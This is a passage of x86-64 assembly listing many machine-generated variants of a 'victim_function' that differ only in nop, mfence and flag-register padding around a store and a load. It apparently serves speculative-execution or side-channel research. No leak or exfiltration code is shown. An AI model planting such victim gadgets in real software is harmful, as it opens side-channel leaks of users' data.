	jmp	.Lvictim_function_win0_continue
## Variant 58
.Lvictim_function_win0_var58:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 59
.Lvictim_function_win0_var59:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 60
.Lvictim_function_win0_var60:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 61
.Lvictim_function_win0_var61:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 62
.Lvictim_function_win0_var62:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 63
.Lvictim_function_win0_var63:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 64
.Lvictim_function_win0_var64:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 65
.Lvictim_function_win0_var65:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 66
.Lvictim_function_win0_var66:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 67
.Lvictim_function_win0_var67:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 68
.Lvictim_function_win0_var68:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 69
.Lvictim_function_win0_var69:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 70
.Lvictim_function_win0_var70:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 71
.Lvictim_function_win0_var71:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 72
.Lvictim_function_win0_var72:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 73
.Lvictim_function_win0_var73:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 74
.Lvictim_function_win0_var74:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 75
.Lvictim_function_win0_var75:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 76
.Lvictim_function_win0_var76:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 77
.Lvictim_function_win0_var77:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 78
.Lvictim_function_win0_var78:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 79
.Lvictim_function_win0_var79:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 80
.Lvictim_function_win0_var80:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	nop
	nop
	nop
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 81
.Lvictim_function_win0_var81:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 82
.Lvictim_function_win0_var82:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 83
.Lvictim_function_win0_var83:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 84
.Lvictim_function_win0_var84:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 85
.Lvictim_function_win0_var85:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 86
.Lvictim_function_win0_var86:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 87
.Lvictim_function_win0_var87:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 88
.Lvictim_function_win0_var88:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 89
.Lvictim_function_win0_var89:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 90
.Lvictim_function_win0_var90:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 91
.Lvictim_function_win0_var91:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 92
.Lvictim_function_win0_var92:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 93
.Lvictim_function_win0_var93:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 94
.Lvictim_function_win0_var94:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 95
.Lvictim_function_win0_var95:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 96
.Lvictim_function_win0_var96:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 97
.Lvictim_function_win0_var97:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 98
.Lvictim_function_win0_var98:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 99
.Lvictim_function_win0_var99:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 100
.Lvictim_function_win0_var100:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 101
.Lvictim_function_win0_var101:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 102
.Lvictim_function_win0_var102:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 103
.Lvictim_function_win0_var103:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 104
.Lvictim_function_win0_var104:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 105
.Lvictim_function_win0_var105:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 106
.Lvictim_function_win0_var106:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 107
.Lvictim_function_win0_var107:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 108
.Lvictim_function_win0_var108:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 109
.Lvictim_function_win0_var109:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 110
.Lvictim_function_win0_var110:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 111
.Lvictim_function_win0_var111:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 112
.Lvictim_function_win0_var112:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 113
.Lvictim_function_win0_var113:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 114
.Lvictim_function_win0_var114:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 115
.Lvictim_function_win0_var115:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 116
.Lvictim_function_win0_var116:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 117
.Lvictim_function_win0_var117:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 118
.Lvictim_function_win0_var118:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 119
.Lvictim_function_win0_var119:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 120
.Lvictim_function_win0_var120:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 121
.Lvictim_function_win0_var121:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 122
.Lvictim_function_win0_var122:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 123
.Lvictim_function_win0_var123:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 124
.Lvictim_function_win0_var124:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 125
.Lvictim_function_win0_var125:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 126
.Lvictim_function_win0_var126:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 127
.Lvictim_function_win0_var127:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 128
.Lvictim_function_win0_var128:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 129
.Lvictim_function_win0_var129:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	nop
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 130
.Lvictim_function_win0_var130:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 131
.Lvictim_function_win0_var131:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 132
.Lvictim_function_win0_var132:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 133
.Lvictim_function_win0_var133:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 134
.Lvictim_function_win0_var134:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 135
.Lvictim_function_win0_var135:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 136
.Lvictim_function_win0_var136:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 137
.Lvictim_function_win0_var137:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 138
.Lvictim_function_win0_var138:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	nop
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 139
.Lvictim_function_win0_var139:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 140
.Lvictim_function_win0_var140:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 141
.Lvictim_function_win0_var141:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 142
.Lvictim_function_win0_var142:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 143
.Lvictim_function_win0_var143:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 144
.Lvictim_function_win0_var144:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 145
.Lvictim_function_win0_var145:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 146
.Lvictim_function_win0_var146:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 147
.Lvictim_function_win0_var147:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 148
.Lvictim_function_win0_var148:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 149
.Lvictim_function_win0_var149:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 150
.Lvictim_function_win0_var150:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 151
.Lvictim_function_win0_var151:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 152
.Lvictim_function_win0_var152:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 153
.Lvictim_function_win0_var153:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 154
.Lvictim_function_win0_var154:
